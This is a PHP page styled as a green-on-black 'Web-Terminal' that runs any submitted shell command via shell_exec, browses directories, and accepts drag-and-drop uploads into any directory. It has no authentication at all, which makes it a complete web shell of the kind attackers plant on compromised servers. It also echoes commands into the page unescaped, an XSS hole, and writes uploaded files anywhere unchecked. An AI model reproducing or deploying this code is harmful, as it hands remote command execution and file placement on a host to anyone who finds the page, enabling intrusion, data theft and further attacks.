<!-- 
Author: Claudio Correa
Date: 12th November 2024
Description: This script dynamically updates a terminal interface with commands and file uploads.
-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web-Terminal</title>
    <style>
        body {
            display: flex;
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            margin: 0;
            padding: 0;
        }
        #sidebar {
            width: 300px;
            background-color: #111;
            padding: 10px;
            height: 100vh;
            overflow-y: auto;
            border-right: 2px solid #0f0;
            box-sizing: border-box;
        }
        #main {
            display: flex;
            flex-grow: 1;
        }
        #sidebar h3 {
            margin: 0;
            color: #0ff;
            text-align: center;
        }
        #sidebar ul {
            list-style: none;
            padding: 0;
        }
        #sidebar ul li {
            margin: 5px 0;
        }
        #drop-area {
            border: 2px dashed #0f0;
            padding: 10px;
            margin: 10px 0;
            text-align: center;
            color: #0f0;
        }
        #terminal {
            flex-grow: 1;
            padding: 20px;
            white-space: pre-wrap;
            overflow-y: auto;
            height: calc(100vh - 20px);
            border-bottom: 2px solid #0f0;
            box-sizing: border-box;
        }
        #input-container {
            width: 100%;
            background-color: #000;
            padding: 10px;
            position: fixed;
            bottom: 0;
            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.5);
        }
        #command-input {
            width: 100%;
            border: none;
            background: none;
            color: #0f0;
            font-family: monospace;
            font-size: 1rem;
            outline: none;
        }
    </style>
</head>
<body>
    <div id="main">
        <div id="sidebar">
            <h3>Directory Explorer</h3>
            <p><strong>Current Path:</strong></p>
            <p id="current-path">
                <?php
                session_start();
                if (!isset($_SESSION['current_dir'])) {
                    $_SESSION['current_dir'] = getcwd();
                }
                echo htmlspecialchars($_SESSION['current_dir']);
                ?>
            </p>
            <div id="drop-area">
                Drag and drop files here to upload
                <p><strong>Contents:</strong></p>
                <ul id="directory-content">
                    <?php
                    function listDirectoryContents($path) {
                        $files = scandir($path);
                        foreach ($files as $file) {
                            if ($file !== "." && $file !== "..") {
                                echo "<li>" . htmlspecialchars($file) . "</li>";
                            }
                        }
                    }

                    listDirectoryContents($_SESSION['current_dir']);
                    ?>
                </ul>
            
            </div>
            </br></br>
        </div>
        <div id="terminal">
            <?php
            // Process commands
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
                $command = $_POST['command'];
                $safeCommand = escapeshellcmd($command);

                // Change directory if the command is 'cd'
                if (strpos($command, 'cd ') === 0) {
                    $newDir = substr($command, 3);
                    $newPath = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $newDir);
                    if ($newPath && is_dir($newPath)) {
                        $_SESSION['current_dir'] = $newPath;
                        $output = "Directory changed to: $newPath";
                    } else {
                        $output = "The directory does not exist.";
                    }
                } else {
                    // Execute command in the current directory
                    $output = shell_exec("cd " . escapeshellarg($_SESSION['current_dir']) . " && " . $safeCommand);
                }

                $_SESSION['history'][] = [
                    'command' => $command,
                    'output' => $output ?: "No output or invalid command."
                ];
            }

            // Handle multiple file uploads
            if (!empty($_FILES['files'])) {
                $uploadedDir = $_SESSION['current_dir'];
                foreach ($_FILES['files']['name'] as $key => $fileName) {
                    $targetPath = $uploadedDir . DIRECTORY_SEPARATOR . basename($fileName);
                    if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $targetPath)) {
                        $_SESSION['history'][] = [
                            'command' => "File Upload",
                            'output' => "File '$fileName' uploaded successfully to '$uploadedDir'."
                        ];
                    } else {
                        $_SESSION['history'][] = [
                            'command' => "File Upload",
                            'output' => "Failed to upload file '$fileName'."
                        ];
                    }
                }
            }

            // Display history
            if (!empty($_SESSION['history'])) {
                foreach ($_SESSION['history'] as $entry) {
                    echo "<span style='color: #0ff;'>\$ {$entry['command']}</span>\n";
                    echo htmlspecialchars($entry['output'], ENT_QUOTES, 'UTF-8') . "\n";
                }
            }
            ?>
        </div>
    </div>
    <div id="input-container">
        <form method="POST" style="margin: 0;">
            <input type="text" id="command-input" name="command" autocomplete="off" autofocus placeholder="Type a command and press Enter">
        </form>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const dropArea = document.getElementById('drop-area');
        const sidebar = document.getElementById('directory-content');

        // Scroll to the bottom of the terminal
        terminal.scrollTop = terminal.scrollHeight;

        // Handle drag-and-drop files for multiple uploads
        dropArea.addEventListener('dragover', (event) => {
            event.preventDefault();
            dropArea.style.borderColor = '#00f';
        });

        dropArea.addEventListener('dragleave', () => {
            dropArea.style.borderColor = '#0f0';
        });

        dropArea.addEventListener('drop', (event) => {
            event.preventDefault();
            dropArea.style.borderColor = '#0f0';

            const files = event.dataTransfer.files;
            const formData = new FormData();

            for (let i = 0; i < files.length; i++) {
                formData.append('files[]', files[i]);
            }

            fetch('', {
                method: 'POST',
                body: formData
            }).then(response => response.text())
              .then(html => {
                  document.body.innerHTML = html;

                  // Refresh sidebar contents
                  fetch('refresh_sidebar.php')
                      .then(response => response.text())
                      .then(updatedSidebar => {
                          sidebar.innerHTML = updatedSidebar;
                      });
              });
        });
    </script>
</body>
</html>
